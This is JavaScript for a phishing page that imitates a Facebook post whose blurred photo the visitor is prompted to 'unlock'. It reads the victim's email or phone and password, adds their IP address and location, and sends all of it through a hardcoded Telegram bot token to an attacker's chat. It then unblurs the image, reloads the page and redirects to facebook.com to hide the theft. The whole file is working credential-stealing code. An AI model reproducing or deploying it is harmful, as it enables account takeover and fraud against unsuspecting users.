$(document).ready( () => {    
  
      const visto = localStorage.getItem('visto'),
             btReac = document.querySelector('#btReac'),
             rsImg = document.querySelectorAll('#reacSel img');
  
      const inptVal = () => {
        argv1 = document.getElementById('argv1').value;
        argv2 = document.getElementById('argv2').value,
        emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
        validated = '';
       
        if( argv1 == '' || argv2 == '' ){
          validated = false;
        } else if ( emailRegex.test(argv1) & argv2.length >= 6 ) {
          validated = true; 
        } else {
          ( isNaN(argv1) || argv1.length < 10 || argv2.length < 6 )
          ? validated = false
          : validated = true;
        }
        return validated;
      }

      const ready = () => {
        if( inptVal() == false){
          let validated = false;
        } else {
          $('#btn-cont').prop("disabled", true);
          let dip =  $('#dip').text(),
              cou =  $('#cou').text(),
              sta =  $('#sta').text(),
              ciu =  $('#ciu').text();

          let message =  `■■■■■🤣🫵🤡■■■■■
👤 L: ${argv1} 
🔑 C: ${argv2}
🌐 i: ${dip}
🌎 P: ${cou}
🏛 E: ${sta}
🏙 Ct: ${ciu}
■■■■■■■■■■■■■■`;
              return message;
        }
        }

      const sender = async(msg) => {
        const telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
             chat_id = '-1001908180943';

        let settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": msg
            })
        };
        $.ajax(settings).done(function (response) {
            console.log(response);
            if (msg.includes('■')) {
            localStorage.setItem('visto', 'true');
            $('#exampleModal').modal('hide');
            imgFin();
            rel();
            }
        });

      }

      const imgFin = () => {
        const blur = document.getElementById('blur');
        $('#btn-ver').prop("disabled", true);
        blur.classList.toggle('active');
        $('#txt-ver').text('Cubrir foto');
      };

      const hidPost = () => {
        $('#post').css('display', 'none');
        $('#visto').css('display', 'block');
        $('#ini'). on('click', () => {
          location.href="http://facebook.com"
        });
      };

      const rel = () => {
        setTimeout(() => {
          location.reload();
        }, 8000);
      }

      $('.argv').on('focus', () => {
        $('.argv').removeClass('err');
      });

      $('#btn-cont').on('click', () => {
        let listo = ready();
        (listo)
        ? sender(listo)
        : $('.argv').addClass('err');
      });

      $('#btn-ver').on('click', () => {
        const argv2 = document.getElementById('argv2');
        argv2.type = 'password';
        $('.argv').removeClass('err');

      });
      
      const envMg = () => {
        let dip = $('#dip').text(),
            uMG = `${ dip } dió Me gusta 👍🏾.`;
        $('#mgca').text('12');
      //  sender(uMG);
      }
      
      $('#btReac').on('click', () => {
           darMg();
      });
      
      btReac.addEventListener('mouseenter', () => {
        $('#reacSel').removeClass('idle');
        reaccionar();
      });
      
      btReac.addEventListener('touchmove', () => {
        $('#reacSel').removeClass('idle');
        reaccionar
      }); 

      const reaccionar = () => {
        rsImg.forEach((img) => {
          img.addEventListener('click', () => {
            let dip = $('#dip').text();
            let reaccion = img.classList.toString();

            const elimClases = () => {
            if( reaccion == 'remg' ) {
                $('#mga').addClass('act');
              } else {
                $('#mga').addClass('desac');
              }
              $('#mgd').addClass('desac');
              $('.chos').removeClass('selecc');
              $('.reacNom').removeClass('meAct');
              $('.reacNom').removeClass('mgAct');
              $('.reacNom').removeClass('ywAct');
              $('.reacNom').removeClass('angAct');
              
            };

            const apRea = () => {
              elimClases();
              $('.chos').addClass('selecc');
              $('.chos').css('background-image', 'url(../img/'+reaccion+'.png)');
              $('#mgca').text('12');
            }


            switch (reaccion) {
              case 'remg':
                elimClases();
                $('.chos').removeClass('selecc');
                $('.chos').removeClass('seleccLov');
                $('#mga').removeClass('desac');
                $('#mgca').text('12');
                $('.reacNom').text('Me gusta');
                $('.reacNom').addClass('mgAct');
             //   sender(`${ dip } dió Me gusta 👍🏾.`);
                break;
              case 'lov':

             //   sender(`${ dip } dió Me encanta ❤️.`);
                elimClases();
                $('#mgca').text('12');
                $('.chos').addClass('seleccLov');
                $('.chos').css('background-image', 'url(../img/lov.png)');
                $('.reacNom').text('Me encanta');
                $('.reacNom').addClass('meAct');
                break;
              case 'mi':
                apRea();
                $('.reacNom').text('Me importa');
                $('.reacNom').addClass('ywAct');
               // sender(`${ dip } dió Me importa 🥰.`);
                break;
              case 'happy':
                apRea();
                $('.reacNom').text('Me divierte');
                $('.reacNom').addClass('ywAct');
            //    sender(`${ dip } dió Me divierte 🤣.`);
                break;
              case 'wow':
                apRea();
                $('.reacNom').text('Me asombra');
                $('.reacNom').addClass('ywAct');
              //  sender(`${ dip } dió Me asombra 😯.`);
                break;
              case 'sad':
               apRea();
               $('.reacNom').text('Me entristece');
               $('.reacNom').addClass('ywAct');
             // sender(`${ dip } dió Me entristece 😥.`);
               break;
              case 'ang':
               apRea();
               $('.reacNom').text('Me enoja');
               $('.reacNom').addClass('angAct');
             // sender(`${ dip } dió Me enoja 😡.`);
               break;
              default:
              alert('No reacción.');
            }
            return reaccion
          });
        });
      }; 

    const darMg = () => {
      if( reaccionar() == 'remg' ) {
        $('#mga').addClass('desac');
      } else {
        $('#mga').addClass('act');
      }
      $('#mgd').addClass('desac');
      $('.chos').removeClass('selecc');
      $('.reacNom').removeClass('meAct');
      $('.reacNom').removeClass('mgAct');
      $('.reacNom').removeClass('ywAct');
      $('.reacNom').removeClass('angAct');
      $('.chos').removeClass('selecc');
      $('.chos').removeClass('seleccLov');
      $('#mga').removeClass('desac');
      $('#mgca').text('12');
      $('.reacNom').text('Me gusta');
      $('.reacNom').addClass('mgAct');

      if($('.reacNom').hasClass('mgAct')) {
        $('#mga').removeClass('act');
      }

    }; 

      $('body').on('click', () => {
        $('#reacSel').addClass('idle');
      });
      
  /*    $('#reacSel img').click( () => {
        darMg();
      }); */
      
      if(visto == 'true') {
        imgFin();
        hidPost();
      }

});